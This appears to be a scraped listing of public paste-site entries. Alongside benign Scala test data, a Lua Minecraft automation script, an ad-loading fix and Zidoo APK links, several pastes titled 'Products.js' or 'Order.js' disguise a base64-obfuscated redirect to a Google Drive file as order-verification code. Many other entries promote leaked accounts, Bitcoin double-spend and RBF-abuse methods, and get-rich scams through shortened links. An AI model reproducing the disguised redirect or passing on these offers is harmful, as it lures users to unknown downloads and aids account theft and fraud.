        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
MvGDn4Jn,Scam Casinos and Stores,jm33,JavaScript,Friday 2nd of May 2025 12:27:45 PM CDT,Method Posted On https://tinyurl.com/rbfmethod | Password: 25760
HJfmQC9P,Leaked Accounts - Fresh Hits,hubertzoo90,JavaScript,Friday 2nd of May 2025 12:27:43 PM CDT,07695 Accounts Posted On https://t.me/leakzbyeminem
u7vc5fsC,testDAta,tills,Scala,Friday 2nd of May 2025 12:24:21 PM CDT,"/**
 * Generuje dane testowe dla tabeli lrx_panel i tworzy tabelę tymczasową
 */
def generatePanelData(spark: SparkSession): Unit = {
  import spark.implicits._
  
  // Dwa sklepy: jeden dobry, jeden zły
  val panelDF = Seq(1, 2).toDF(""shop_id"")
  
  // Tworzenie tabeli tymczasowej
  panelDF.createOrReplaceTempView(""lrx_panel"")
  
  println(""Tabela lrx_panel utworzona z 2 sklepami"")
}

/**
 * Generuje dane testowe dla tabeli dim_pack i tworzy tabelę tymczasową
 */
def generateDimPackData(spark: SparkSession): Unit = {
  import spark.implicits._
  
  // Dane z lekami RX i OTC - teraz używamy int dla pack_id
  val data = Seq(
    (1, ""RX"", 20210101, 20211231),
    (2, ""RX"", 20210101, 20211231),
    (3, ""OTC"", 20210101, 20211231)
  )
  
  val dimPackDF = data.toDF(""pack_id"", ""basket_4_code"", ""day_id_from"", ""day_id_to"")
  
  // Tworzenie tabeli tymczasowej
  dimPackDF.createOrReplaceTempView(""dim_pack"")
  
  println(""Tabela dim_pack utworzona z 3 produktami"")
}

/**
 * Generuje dane testowe sprzedaży i zwraca DataFrame
 */
def generateSalesData(spark: SparkSession): DataFrame = {
  import spark.implicits._
  
  // Dane dla dobrego sklepu (sklep_id=1)
  val goodShopData = Seq(
    // miesiąc 1 - 202101 - stałe wartości (20 pacjentów, głównie RX)
    (1, 202101, 1, 101, 1, 20210115, 1),
    (1, 202101, 2, 102, 1, 20210115, 1),
    (1, 202101, 3, 103, 1, 20210115, 1),
    (1, 202101, 4, 104, 1, 20210115, 2),
    (1, 202101, 5, 105, 1, 20210115, 2),
    (1, 202101, 6, 106, 2, 20210115, 2),
    (1, 202101, 7, 107, 2, 20210115, 3),
    (1, 202101, 8, 108, 2, 20210115, 3),
    (1, 202101, 9, 109, 2, 20210115, 3),
    (1, 202101, 10, 110, 2, 20210115, 1),
    (1, 202101, 11, 111, 3, 20210116, null),
    (1, 202101, 12, 112, 3, 20210116, null),
    (1, 202101, 13, 113, 3, 20210116, null),
    (1, 202101, 14, 114, 1, 20210116, 2),
    (1, 202101, 15, 115, 1, 20210116, 2),
    (1, 202101, 16, 116, 1, 20210116, 3),
    (1, 202101, 17, 117, 1, 20210116, 3),
    (1, 202101, 18, 118, 2, 20210116, 1),
    (1, 202101, 19, 119, 2, 20210116, 1),
    (1, 202101, 20, 120, 2, 20210116, 2),
    
    // miesiąc 2 - 202102 - podobne stałe wartości
    (1, 202102, 1, 201, 1, 20210215, 1),
    (1, 202102, 2, 202, 1, 20210215, 1),
    (1, 202102, 3, 203, 1, 20210215, 1),
    (1, 202102, 4, 204, 1, 20210215, 2),
    (1, 202102, 5, 205, 1, 20210215, 2),
    (1, 202102, 6, 206, 2, 20210215, 2),
    (1, 202102, 7, 207, 2, 20210215, 3),
    (1, 202102, 8, 208, 2, 20210215, 3),
    (1, 202102, 9, 209, 2, 20210215, 3),
    (1, 202102, 10, 210, 2, 20210215, 1),
    (1, 202102, 11, 211, 3, 20210216, null),
    (1, 202102, 12, 212, 3, 20210216, null),
    (1, 202102, 13, 213, 3, 20210216, null),
    (1, 202102, 14, 214, 1, 20210216, 2),
    (1, 202102, 15, 215, 1, 20210216, 2),
    (1, 202102, 16, 216, 1, 20210216, 3),
    (1, 202102, 17, 217, 1, 20210216, 3),
    (1, 202102, 18, 218, 2, 20210216, 1),
    (1, 202102, 19, 219, 2, 20210216, 1),
    (1, 202102, 20, 220, 2, 20210216, 2),
    
    // miesiąc 3 - 202103 - podobne stałe wartości
    (1, 202103, 1, 301, 1, 20210315, 1),
    (1, 202103, 2, 302, 1, 20210315, 1),
    (1, 202103, 3, 303, 1, 20210315, 1),
    (1, 202103, 4, 304, 1, 20210315, 2),
    (1, 202103, 5, 305, 1, 20210315, 2),
    (1, 202103, 6, 306, 2, 20210315, 2),
    (1, 202103, 7, 307, 2, 20210315, 3),
    (1, 202103, 8, 308, 2, 20210315, 3),
    (1, 202103, 9, 309, 2, 20210315, 3),
    (1, 202103, 10, 310, 2, 20210315, 1),
    (1, 202103, 11, 311, 3, 20210316, null),
    (1, 202103, 12, 312, 3, 20210316, null),
    (1, 202103, 13, 313, 3, 20210316, null),
    (1, 202103, 14, 314, 1, 20210316, 2),
    (1, 202103, 15, 315, 1, 20210316, 2),
    (1, 202103, 16, 316, 1, 20210316, 3),
    (1, 202103, 17, 317, 1, 20210316, 3),
    (1, 202103, 18, 318, 2, 20210316, 1),
    (1, 202103, 19, 319, 2, 20210316, 1),
    (1, 202103, 20, 320, 2, 20210316, 2),
    
    // miesiąc 4 - 202104 - podobne stałe wartości
    (1, 202104, 1, 401, 1, 20210415, 1),
    (1, 202104, 2, 402, 1, 20210415, 1),
    (1, 202104, 3, 403, 1, 20210415, 1),
    (1, 202104, 4, 404, 1, 20210415, 2),
    (1, 202104, 5, 405, 1, 20210415, 2),
    (1, 202104, 6, 406, 2, 20210415, 2),
    (1, 202104, 7, 407, 2, 20210415, 3),
    (1, 202104, 8, 408, 2, 20210415, 3),
    (1, 202104, 9, 409, 2, 20210415, 3),
    (1, 202104, 10, 410, 2, 20210415, 1),
    (1, 202104, 11, 411, 3, 20210416, null),
    (1, 202104, 12, 412, 3, 20210416, null),
    (1, 202104, 13, 413, 3, 20210416, null),
    (1, 202104, 14, 414, 1, 20210416, 2),
    (1, 202104, 15, 415, 1, 20210416, 2),
    (1, 202104, 16, 416, 1, 20210416, 3),
    (1, 202104, 17, 417, 1, 20210416, 3),
    (1, 202104, 18, 418, 2, 20210416, 1),
    (1, 202104, 19, 419, 2, 20210416, 1),
    (1, 202104, 20, 420, 2, 20210416, 2)
  )
  
  // Dane dla złego sklepu (sklep_id=2) - duże wahania i brak danych w ostatnim miesiącu
  val badShopData = Seq(
    // miesiąc 1 - 202101 - dużo RX (30 pacjentów)
    (2, 202101, 101, 1001, 1, 20210115, 1),
    (2, 202101, 102, 1002, 1, 20210115, 1),
    (2, 202101, 103, 1003, 1, 20210115, 1),
    (2, 202101, 104, 1004, 1, 20210115, 2),
    (2, 202101, 105, 1005, 1, 20210115, 2),
    (2, 202101, 106, 1006, 1, 20210115, 3),
    (2, 202101, 107, 1007, 1, 20210115, 1),
    (2, 202101, 108, 1008, 1, 20210115, 2),
    (2, 202101, 109, 1009, 1, 20210115, 3),
    (2, 202101, 110, 1010, 1, 20210115, 1),
    (2, 202101, 111, 1011, 1, 20210116, 2),
    (2, 202101, 112, 1012, 1, 20210116, 3),
    (2, 202101, 113, 1013, 1, 20210116, 1),
    (2, 202101, 114, 1014, 1, 20210116, 2),
    (2, 202101, 115, 1015, 1, 20210116, 3),
    (2, 202101, 116, 1016, 2, 20210116, 1),
    (2, 202101, 117, 1017, 2, 20210116, 2),
    (2, 202101, 118, 1018, 2, 20210116, 3),
    (2, 202101, 119, 1019, 2, 20210116, 1),
    (2, 202101, 120, 1020, 2, 20210116, 2),
    (2, 202101, 121, 1021, 3, 20210117, null),
    (2, 202101, 122, 1022, 3, 20210117, null),
    (2, 202101, 123, 1023, 3, 20210117, null),
    (2, 202101, 124, 1024, 3, 20210117, null),
    (2, 202101, 125, 1025, 3, 20210117, null),
    (2, 202101, 126, 1026, 2, 20210117, 3),
    (2, 202101, 127, 1027, 2, 20210117, 1),
    (2, 202101, 128, 1028, 2, 20210117, 2),
    (2, 202101, 129, 1029, 2, 20210117, 3),
    (2, 202101, 130, 1030, 2, 20210117, 1),
    
    // miesiąc 2 - 202102 - mało pacjentów (5) i brak RX
    (2, 202102, 101, 2001, 3, 20210215, null),
    (2, 202102, 102, 2002, 3, 20210215, null),
    (2, 202102, 103, 2003, 3, 20210215, null),
    (2, 202102, 104, 2004, 3, 20210215, null),
    (2, 202102, 105, 2005, 3, 20210215, null),
    
    // miesiąc 3 - 202103 - znowu dużo pacjentów (25) i dużo RX
    (2, 202103, 101, 3001, 1, 20210315, 1),
    (2, 202103, 102, 3002, 1, 20210315, 1),
    (2, 202103, 103, 3003, 1, 20210315, 1),
    (2, 202103, 104, 3004, 1, 20210315, 2),
    (2, 202103, 105, 3005, 1, 20210315, 2),
    (2, 202103, 106, 3006, 1, 20210315, 3),
    (2, 202103, 107, 3007, 1, 20210315, 1),
    (2, 202103, 108, 3008, 1, 20210315, 2),
    (2, 202103, 109, 3009, 1, 20210315, 3),
    (2, 202103, 110, 3010, 1, 20210315, 1),
    (2, 202103, 111, 3011, 1, 20210316, 2),
    (2, 202103, 112, 3012, 1, 20210316, 3),
    (2, 202103, 113, 3013, 1, 20210316, 1),
    (2, 202103, 114, 3014, 1, 20210316, 2),
    (2, 202103, 115, 3015, 1, 20210316, 3),
    (2, 202103, 116, 3016, 2, 20210316, 1),
    (2, 202103, 117, 3017, 2, 20210316, 2),
    (2, 202103, 118, 3018, 2, 20210316, 3),
    (2, 202103, 119, 3019, 2, 20210316, 1),
    (2, 202103, 120, 3020, 2, 20210316, 2),
    (2, 202103, 121, 3021, 3, 20210317, null),
    (2, 202103, 122, 3022, 3, 20210317, null),
    (2, 202103, 123, 3023, 3, 20210317, null),
    (2, 202103, 124, 3024, 3, 20210317, null),
    (2, 202103, 125, 3025, 3, 20210317, null)
    
    // miesiąc 4 - 202104 - brak danych celowo (naruszenie reguł)
  )
  
  // Łączymy dane i tworzymy DataFrame
  val allData = goodShopData ++ badShopData
  val salesDF = spark.createDataFrame(allData).toDF(
    ""shop_id"", ""month_id"", ""patient_id"", ""trn_id"", ""pack_id"", ""day_id"", ""prescriber_id""
  )
  
  println(s""Wygenerowano dane sprzedaży z ${salesDF.count()} rekordami"")
  
  salesDF
}"
9NQSR1bE,Make $1000 15-MINUTES  (BEGINNER) YR,n1gg3r2126,JavaScript,Friday 2nd of May 2025 12:22:20 PM CDT," 
Pdf https://tinyurl.com/freshleaks

7W4pyRtyP1
"
3DtAFri2,Products.js,zebmekey,JavaScript,Friday 2nd of May 2025 12:13:09 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/14566/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
8y7ZXwTk,EARN $900 INSTANTLY 2025 95,n1gg3r2126,JavaScript,Friday 2nd of May 2025 12:13:06 PM CDT," 
Pdf https://tinyurl.com/freshleaks

20OWUzZF5q
"
3WiyNx3n,Doublespending using Vanity Wallet,jm33,JavaScript,Friday 2nd of May 2025 12:12:19 PM CDT,Method Posted On https://tinyurl.com/rbfmethod | Password: 25070
cjrf7K0q,Chaturbate with Tokens,hubertzoo90,JavaScript,Friday 2nd of May 2025 12:12:19 PM CDT,20909 Accounts Posted On https://t.me/leakzbyeminem
sxxvuMHQ,ad referer fix,petar_bonov,JavaScript,Friday 2nd of May 2025 12:06:49 PM CDT,"// BEFORE

const extractAdUnitId = (input) => {
    const match = input.match(/_A\.(\d+)\./);
    return match ? match[1] : """";
};
const divElement = document.createElement(""div"");
const objectElement = document.createElement(""object"");
objectElement.type = ""text/html"";
const baseUrl = ""https://img.gsmarena.com/banner.php3"";
const params = new URLSearchParams({
    adUnitID: `${extractAdUnitId(""/8095840/.2_A.35723.3_gsmarena.com_tier1"")}`,
    pageid: ""1"",
    country: ""RO"",
    lpe: """",
    keyw: """",
    visitqos: ""1"",
});
objectElement.data = `${baseUrl}?${params.toString()}`;
objectElement.width = ""728px"";
objectElement.height = ""94px"";
objectElement.style.overflow = ""auto"";
divElement.appendChild(objectElement);
document.body.appendChild(divElement);

// AFTER

const extractAdUnitId = (input) => {
    const match = input.match(/_A\.(\d+)\./);
    return match ? match[1] : """";
};
const divElement = document.createElement(""div"");
const baseUrl = ""https://img.gsmarena.com/banner.php3"";
const params = new URLSearchParams({
    adUnitID: `${extractAdUnitId(""/8095840/.2_A.35723.3_gsmarena.com_tier1"")}`,
    pageid: ""1"",
    country: ""RO"",
    lpe: """",
    keyw: """",
    visitqos: ""1"",
});
const url = `${baseUrl}?${params.toString()}`;
divElement.width = ""728px"";
divElement.height = ""94px"";
divElement.style.overflow = ""auto"";
document.body.appendChild(divElement);

const xhr = new XMLHttpRequest();
xhr.onreadystatechange = function() {
    if (this.readyState == 4 && this.status == 200) {
        const HTMLParser = new DOMParser();
        const parsedDocument = HTMLParser.parseFromString(this.responseText, ""text/html"");
        divElement.innerHTML = `${parsedDocument.head.innerHTML}${parsedDocument.body.innerHTML}`;
    }
};
xhr.open(""GET"", url, true);
xhr.send();"
zPs8Wf5L,Untitled,111fffgg,C++,Friday 2nd of May 2025 12:04:29 PM CDT,"กดเกดเกดเ
เกดดหด
เกดเกด
เกดเกดเกดเ
XPX3R-9FCX6-a9c1550f"
MnBQ7u5z,Forestry v1,KaychenHH,Lua,Friday 2nd of May 2025 11:59:23 AM CDT,"--Forestry V1.01
--written in 05/2025 by Kay Michaelsen
--
--vardef
--
monitor1 = peripheral.wrap(""monitor_16"")
monitor2 = peripheral.wrap(""monitor_0"")
monitor3 = peripheral.wrap(""monitor_15"")
monitor4 = peripheral.wrap(""monitor_8"")
monitor5 = peripheral.wrap(""monitor_10"")
--monitor6 = peripheral.wrap(""monitor_16"")
rss = peripheral.wrap(""meBridge_0"")
--
obergrenze = 1000
aPro = 0

arsn = ""ars_nouveau:""
arse = ""ars_elemental:""
myst = ""mysticalagriculture:""
imm = ""immersiveengineering:""
minc = ""minecraft:""
biom = ""biomesoplenty:""
cau =""caupona:""
dyn = ""integrateddynamics:""
twf = ""twilightforest""

automat = true
dPage = 1
dMax = 0

pName = {}
pDN = {}
pStat = {}
pByte = {}
pFound = {}
pStored = {}
pSide = {}
pMax = {}
aPro = 28
dMax = math.floor(aPro / 18) +1

for zahl = 1, aPro do
    pMax[zahl] = obergrenze
end
for lauf = 1,14 do
    pSide[lauf] = 1
	pSide[lauf + 15] = 2
end
for lauf = 1, aPro do
    pStored[lauf] = 0
end

pName[1] = minc..""oak_log""
pDN[1] = ""Oak""
pStat[1] = false
pByte[1] = colors.green
pSide[1] = 1
pMax[1] = 3000

pName[2] = minc..""dark_oak_log""
pDN[2] = ""Dark Oak""
pStat[2] = false
pByte[2] = colors.brown
pSide[2] = 1
pMax[2] = 3000

pName[3] = minc..""bamboo""
pDN[3] = ""Bamboo""
pStat[3] = false
pByte[3] = colors.blue
pSide[3] = 1
pMax[3] = 1000

pName[4] = dyn..""menril_log""
pDN[4] = ""Menril""
pStat[4] = true
pByte[4] = colors.purple
pSide[4] = 1
pMax[4] = 1000

pName[5] = arsn..""blue_archwood_log""
pDN[5] = ""Cascading Ar.""
pStat[5] = false
pByte[5] = colors.cyan
pSide[5] = 1
pMax[5] = 1000

pName[6] = arsn..""red_archwood_log""
pDN[6] = ""Blazing Ar.""
pStat[6] = false
pByte[6] = colors.lightGray
pSide[6] = 1
pMax[6] = 1000

pName[7] = arsn..""green_archwood_log""
pDN[7] = ""FlourishAr.""
pStat[7] = true
pByte[7] = colors.gray
pSide[7] = 1
pMax[7] = 1000

pName[8] = arse..""yellow_archwood_log""
pDN[8] = ""Flashing Ar.""
pStat[8] = true
pByte[8] = colors.pink
pSide[8] = 1
pMax[8] = 1000

pName[9] =arsn..""purple_archwood_log""
pDN[9] = ""Vexing Ar.""
pStat[9] = false
pByte[9] = colors.lime
pSide[9] = 1
pMax[9] = 1000

pName[10] = biom..""palm_log""
pDN[10] = ""Palm""
pStat[10] = false
pByte[10] = colors.yellow
pSide[10] = 1
pMax[10] = 1000

pName[11] = minc..""acacia_log""
pDN[11] = ""Acacia""
pStat[11] = false
pByte[11] = colors.lightBlue
pSide[11] = 1
pMax[11] = 1000

pName[12] = minc..""mangrove_log""
pDN[12] = ""Mangrove Pr.""
pStat[12] = false
pByte[12] = colors.magenta
pSide[12] = 1
pMax[12] = 1000

pName[13] = twf..""mangrove_log""
pDN[13] = ""Mangrove""
pStat[13] = true
pByte[13] = colors.orange
pSide[13] = 1
pMax[13] = 1000

pName[14] = ""blue_skies:maple_log""
pDN[14] = ""Maple""
pStat[14] = true
pByte[14] = colors.white
pMax[14] = 1000
pSide[14] = 1

pName[15] = ""silentgear:netherwood_log""
pDN[15] = ""Netherwood""
pStat[15] = true
pByte[15] = colors.green
pSide[15] = 2
pMax[15] = 1000

pName[16] = minc..""birch_log""
pDN[16] = ""Birch""
pStat[16] = true
pByte[16] = colors.brown
pSide[16] = 2
pMax[16] = 1000

pName[17] = minc..""cherry_log""
pDN[17] = ""Cherry""
pStat[17] = true
pByte[17] = colors.blue
pSide[17] = 2
pMax[17] = 1000

pName[18] = biom..""mahogany_log""
pDN[18] = ""Mahogany""
pStat[18] = true
pByte[18] = colors.purple
pSide[18] = 2
pMax[18] = 1000

pName[19] = biom..""redwood_log""
pDN[19] = ""Redwood""
pStat[19] = true
pByte[19] = colors.cyan
pSide[19] = 2
pMax[19] = 1000

pName[20] = ""gtceu:rubber_log""
pDN[20] = ""Rubber""
pStat[20] = true
pByte[20] = colors.lightGray
pSide[20] = 2
pMax[20] = 1000

pName[21] = ""aether:skyroot_log""
pDN[21] = ""Skyroot""
pStat[21] = true
pByte[21] = colors.gray
pSide[21] = 2
pMax[21] = 1000

pName[22] = ""undergarden:grongle_log""
pDN[22] = ""Grongle""
pStat[22] = true
pByte[22] = colors.pink
pSide[22] = 2
pMax[22] = 1000

pName[23] = ""undergarden:smogstem_log""
pDN[23] = ""Smogstem""
pStat[23] = true
pByte[23] = colors.lime
pSide[23] = 2
pMax[23] = 1000

pName[24] = cau..""walnut_log""
pDN[24] = ""Walnut""
pStat[24] = true
pByte[24] = colors.yellow
pSide[24] = 2
pMax[24] = 1000

pName[25] = minc..""spruce_log""
pDN[25] = ""Spruce""
pStat[25] = true
pByte[25] = colors.lightBlue
pSide[25] = 2
pMax[25] = 1000

pName[26] = minc..""jungle_log""
pDN[26] = ""Jungle""
pStat[26] = true
pByte[26] = colors.magenta
pSide[26] = 2
pMax[26] = 1000

pName[27] = ""croptopia:cinnamon_log""
pDN[27] = ""Cinnamon""
pStat[27] = true
pByte[27] = colors.orange
pSide[27] = 2
pMax[27] = 1000

pName[28] = biom..""jacaranda_log""
pDN[28] = ""Jacaranda""
pStat[28] = true
pByte[28] = colors.white
pSide[28] = 2
pMax[28] = 1000



function UserCommand( xpos, ypos)

    local bunt = {}

    print(""UC"" ,xpos ,ypos)
    if ypos == 23 then
        if (xpos>42) and (xpos<54) then
            if automat == true then
                automat = false
            else
                automat = true
            end
        end
    elseif ypos == 1 then
        if (xpos<6) then
            --prev page
            if dPage > 1 then
                dPage = dPage -1
            end
        elseif (xpos>52) then
            if dPage < dMax then
                dPage = dPage +1
            end
        end
    elseif (ypos == 4) or (ypos == 7) or (ypos == 10) or (ypos == 13) or (ypos == 16) or (ypos == 19) then
        npos = (ypos-1) / 3 - 1
        mpos = 0
        if (xpos>9) and (xpos<16) then
            mpos = 1
        elseif (xpos>28) and (xpos<35) then
            mpos = 2
        elseif (xpos>47) and (xpos<54) then
            mpos = 3
        end
        if not(mpos == 0) then
            proNr = (dPage - 1) * 18 + npos * 3 + mpos
            print(proNr)
            if pStat[proNr] == false then
                pStat[proNr] = true
            else
                pStat[proNr] = false
            end
            bunt[1] = 0
            bunt[2] = 0
            bunt[3] = 0
            for mpos = 1, aPro do
                if pStat[mpos] == true then
                    bunt[pSide[mpos]] = bunt[pSide[mpos]] + pByte[mpos]
                end
            end

            redstone.setBundledOutput(""right"", bunt[1])
            redstone.setBundledOutput(""bottom"", bunt[2])
            --redstone.setBundledOutput(""bottom"", bunt[3])
            print(bunt[1], bunt[2])
        end
    end
end


function CheckInferiumReihe(lesen)


    for i = 1,aPro do
        pFound[i] = false
    end

    such = {}
    such.name = ""mysticalagriculture""

    rs = rss.listItems()

    if not(rs == nil) then
        for slot, item in pairs(rs) do
            for i = 1, aPro do
                if item.name == pName[i] then
                    found = true
                    pStored[i] = item.amount
                    pFound[i] = true
                    if automat == true then
                        if item.amount > pMax[i] then
                            pStat[i] = false
                        else
                            pStat[i] = true
                        end
                    end
                end

            end
        end

        for I = 1, aPro do
            if pFound[i] == false then
                print(pName[i].."" not found!"")
            end
        end
    end

	rs = rss.listFluid()

	if not(rs == nil) then
        for slot, item in pairs(rs) do
            for i = 1, aPro do
                if item.name == pName[i] then
                    found = true
                    pStored[i] = item.amount / 1000
                    pFound[i] = true
                    if automat == true then
                        if (item.amount / 1000) > pMax[i] then
                            pStat[i] = false
                        else
                            pStat[i] = true
                        end
                    end
                end

            end
        end
	end


    local bunt = {}
    bunt[1] = 0
    bunt[2] = 0
    bunt[3] = 0
    for i = 1, aPro do
        if pStat[i] == true then
            bunt[pSide[i]] = bunt[pSide[i]] + pByte[i]
        end
    end
    redstone.setBundledOutput(""right"", bunt[1])
    redstone.setBundledOutput(""bottom"", bunt[2])
    --redstone.setBundledOutput(""bottom"", bunt[3])

end

function MonAufbau(moni)

    if not(moni == nil) then
        moni.setTextScale(0.5)
        moni.setBackgroundColor(colors.black)
        moni.clear()
        moni.setBackgroundColor(colors.green)
        moni.setTextColor(colors.black)
        moni.setCursorPos(13,1)
        moni.write("" *** Wuffelz Forestry Control *** "")

        moni.setCursorPos(2,1)
        if dPage > 1 then
            moni.setBackgroundColor(colors.orange)
        else
            moni.setBackgroundColor(colors.black)
            moni.setTextColor(colors.orange)
        end
        moni.write("" << "")

        moni.setCursorPos(7,1)
        moni.setBackgroundColor(colors.black)
        moni.setTextColor(colors.orange)
        moni.write(string.format(""%1d"", dPage))

        moni.setCursorPos(53,1)
        if dPage < dMax then
            moni.setBackgroundColor(colors.orange)
            moni.setTextColor(colors.black)
        else
            moni.setBackgroundColor(colors.black)
            moni.setTextColor(colors.orange)
        end
        moni.write("" >> "")

        for i = 1,6 do
            k = (i-1) * 3 + 1
            for j = 0,2 do
                moni.setBackgroundColor(colors.black)
                moni.setTextColor(colors.blue)
                if j == 1 then
                    moni.setTextColor(colors.orange)
                end
                px = j * 19
                py = (i-1) * 3 + 3
                moni.setCursorPos(px + 1, py)
                pr = k + j + ((dPage - 1) * 18)
                if pr <= aPro then
                    moni.write(pDN[pr])
                    moni.setCursorPos(px+13, py)
                    moni.write(string.format(""%6d"", pStored[pr]))
                    moni.setCursorPos(px + 1, py + 1)
                    if pStat[pr] == true then
                        moni.setTextColor(colors.lime)
                        moni.write(""online"")
                        moni.setTextColor(colors.white)
                        moni.setBackgroundColor(colors.red)
                        moni.setCursorPos(px + 10, py + 1)
                        moni.write(""-> off"")
                    else
                        moni.setTextColor(colors.red)
                        moni.write(""offline"")
                        moni.setTextColor(colors.white)
                        moni.setBackgroundColor(colors.lime)
                        moni.setCursorPos(px + 10, py + 1)
                        moni.write(""-> on "")
                    end
                end
            end
        end
        moni.setBackgroundColor(colors.black)
        moni.setTextColor(colors.blue)
        moni.setCursorPos(5,23)
        moni.write(""Automatic limit control is "")
        moni.setCursorPos(33,23)
        if automat then
            moni.setTextColor(colors.lime)
            moni.write(""enabled "")
            moni.setCursorPos(43,23)
            moni.setBackgroundColor(colors.red)
            moni.setTextColor(colors.white)
            moni.write(""-> disable "")
        else
            moni.setTextColor(colors.red)
            moni.write(""disabled "")
            moni.setCursorPos(43,23)
            moni.setBackgroundColor(colors.lime)
            moni.setTextColor(colors.white)
            moni.write(""-> enable "")
        end


    end

end


while true do

    CheckInferiumReihe(lesen)

    MonAufbau(monitor1)
    MonAufbau(monitor2)
    MonAufbau(monitor3)
    MonAufbau(monitor4)
    MonAufbau(monitor5)
    --MonAufbau(monitor6)

    event, button, x, y = os.pullEventRaw()

    if event == ""terminate"" then
        break
    elseif event == ""redstone"" then
        --neuer Durchlauf
    elseif (event == ""monitor_touch"") and (button == ""monitor_16"") then
        UserCommand( x, y)
    elseif (event == ""monitor_touch"") and (button == ""monitor_0"") then
        UserCommand( x, y)
    elseif (event == ""monitor_touch"") and (button == ""monitor_15"") then
        UserCommand( x, y)
    elseif (event == ""monitor_touch"") and (button == ""monitor_8"") then
        UserCommand( x, y)
    elseif (event == ""monitor_touch"") and (button == ""monitor_10"") then
        UserCommand( x, y)
    else
        print(event, button, x, y)
    end

end


"
RX5kaywW,Order.js,zebmekey,JavaScript,Friday 2nd of May 2025 11:57:47 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/15220/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
8fuFkjXF,Abuse RBF in BTC transactions,jm33,JavaScript,Friday 2nd of May 2025 11:56:50 AM CDT,Method Posted On https://tinyurl.com/rbfmethod | Password: 61314
8WSEeVZy,Crypto Accounts,hubertzoo90,JavaScript,Friday 2nd of May 2025 11:56:46 AM CDT,88204 Accounts Posted On https://t.me/leakzbyeminem
vkye9pLD,Home Theatre 5 Update / TMDB Fix,Devotee8677,HTML,Friday 2nd of May 2025 11:43:30 AM CDT,"**************Home Theatre 5 Update / TMDB Fix first published on April 18, 2025 **********************************

CHANGELOG: 
This is an update to the recently released patch to HT5 for the TMDB scraping issues we've been having.

1. Optimized poster wall matching accuracy
2 Optimized trailer retrieval for poster wall
3. Added dynamic background feature to poster wall
4. Fixed the occasional crash issue

NOTE: If you're not sure what to do with this file (.apk), please see this post:

ZIDOO LINK:       https://forum.zidoo.tv/index.php?threads/how-to-install-an-apk-file-on-a-zidoo-box.100271/

Thanks Zidoo, Markswift2003, and others for staying on top off it all.
Here are all the files and their mirrors for each device.
One pastebin to solve world peace
nc88keyz - out!

_________________________________________________________________________________

**************Realktek 1295 Series************************************************

This file is for Realtek 1295 models only:
MODELS: X8/X9S/X10
VERSION: v4.3.55 (RTD1295)
RELEASE DATE: 25-04-25
ZIDOO LINK:         https://apidl.zidoo.tv/app/poster/zidoo_poster_RTD1295_v4.3.55.apk
MCBLUNA MIRROR:     https://1drv.ms/u/c/e0ea6dbeca4dec92/EUVZNmaAKBVPqhbiF27M2boByHVsgwHpzGiVBB8mCzt3bQ

*************Realtek 1296 Series**************************************************

This file is for Realtek 1296 models only:
MODELS: Z9S/Z10/Z1000/X20/X20 Pro/UHD2000
VERSION: v4.3.52 (RTD1296)
RELEASE DATE: 25-04-18
ZIDOO LINK:         https://apidl.zidoo.tv/app/poster/zidoo_poster_RTD1296_v4.3.52.apk
MCBLUNA MIRROR:     https://1drv.ms/u/c/e0ea6dbeca4dec92/EQQp8Clb1RNMqlMXDg3q6nABU76E_YDXV1MEsUvRbgS-qg

***********Realtek 1619DR Series**************************************************

This file is for Realtek 1619DR models only:
MODELS: Z9X/Z10 Pro/Z1000 Pro/UHD3000/NEOS /NEO Alpha/NEO X
VERSION: v4.3.52 (RTD1619DR)
RELEASE DATE: 25-04-18
ZIDOO LINK:         https://apidl.zidoo.tv/app/poster/zidoo_poster_RTD1619_v4.3.52.apk
MCBLUNA MIRROR:     https://1drv.ms/u/c/e0ea6dbeca4dec92/EaHIRv9X5eFAgTwP8UNIn-gBC-h8wc0QrLEWkcw3-ac5kA

***********Realtek 1619BDP Series ************************************************

This file is for Realtek 1619BPD Series only:
